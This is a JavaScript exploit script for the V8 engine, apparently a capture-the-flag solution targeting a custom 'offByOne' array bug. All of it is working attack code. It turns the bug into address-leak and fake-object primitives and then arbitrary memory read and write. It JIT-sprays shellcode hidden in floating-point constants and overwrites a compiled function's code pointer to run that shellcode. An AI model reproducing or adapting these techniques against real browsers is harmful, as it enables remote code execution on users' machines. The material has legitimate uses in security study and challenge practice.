var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);

function hex(i) {
    return i.toString(16).padStart(8, "0");
}

function i2f(i) {
    bigUint64[0] = i;
    return f64[0];
}

function f2i(i) {
    f64[0] = i;
    return bigUint64[0];
}

function u2f(low, high) {
    u32[0] = low;
    u32[1] = high;
    return f64[0];
}

function u2i(low, high) {
    u32[0] = low;
    u32[1] = high;
    return bigUint64[0];
}

function i2u_l(i) {
    bigUint64[0] = i;
    return u32[0];
}

function i2u_h(i) {
    bigUint64[0] = i;
    return u32[1];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK = (m) => console.log(`[+] ${m}`);
const logErr = (m) => console.log(`[-] ${m}`);

function toHex(x, w = 16) {
    x = BigInt.asUintN(64, BigInt(x));
    return "0x" + x.toString(16).padStart(w, "0");
}

function shellcode() {
    return [
        1.9995716422075807e-246,
        1.9710255944286777e-246,
        1.97118242283721e-246,
        1.971136949489835e-246,
        1.9711826272869888e-246,
        1.9711829003383248e-246,
        -9.254983612527998e+61];
}

for (let i = 0; i < 10000; i++) shellcode();

let a = [1.1];
let obj = { in1: 1 };
obj.out1 = 2;
obj.out2 = 3;

let temp = f2i(a.offByOne()); //map, properties
let obj_array_map = i2u_l(temp);
console.log("obj_array_map-->0x" + hex(obj_array_map));

array_addr = i2u_h(temp) - 0x7c;
a.offByOne(u2f(obj_array_map, array_addr));
obj.out2 = 0x1000; //a.len = 0x1000;

let b = [2.2, 3.3, 4.4];

temp = f2i(a[54]);
double_array_map = i2u_l(temp);
double_properties = i2u_h(temp);
console.log("double_array_map-->0x" + hex(double_array_map));

function GetAddressOf(target) {
    a[54] = u2f(obj_array_map, 0);
    b[0] = target;
    a[54] = u2f(double_array_map, 0);
    return f2i(b[0]);
}

function GetFakeObject(addr) {
    a[54] = u2f(double_array_map, 0);
    b[0] = u2f(addr, 0);
    a[54] = u2f(obj_array_map, 0);
    return b[0];
}

shellcode_addr = GetAddressOf(shellcode);
console.log("shellcode_addr-->0x" + hex(shellcode_addr));

let fake_array = [u2f(double_array_map, 0), u2f(i2u_l(shellcode_addr) - 0x8, 100)];
fake_array_addr = GetAddressOf(fake_array);
fake_obj = GetFakeObject(i2u_l(fake_array_addr) + 0x54);


function ArbRead64(addr) {
    fake_array[1] = u2f(addr - 8 + 1, 100);
    return f2i(fake_obj[0]);
}

function ArbWrite64(addr, data) {
    fake_array[1] = u2f(addr - 8 + 1, 100);
    fake_obj[0] = i2f(data);
}

code_addr = ArbRead64(i2u_l(shellcode_addr) + 0xc - 1);
console.log("code_addr-->0x" + hex(code_addr));

machine_code_addr = ArbRead64(i2u_l(code_addr) - 1 + 0x14);
console.log("machine_code_addr-->0x" + hex(machine_code_addr));

malice = machine_code_addr + 0x6bn;
ArbWrite64(i2u_l(code_addr) - 1 + 0x14, malice);

shellcode();
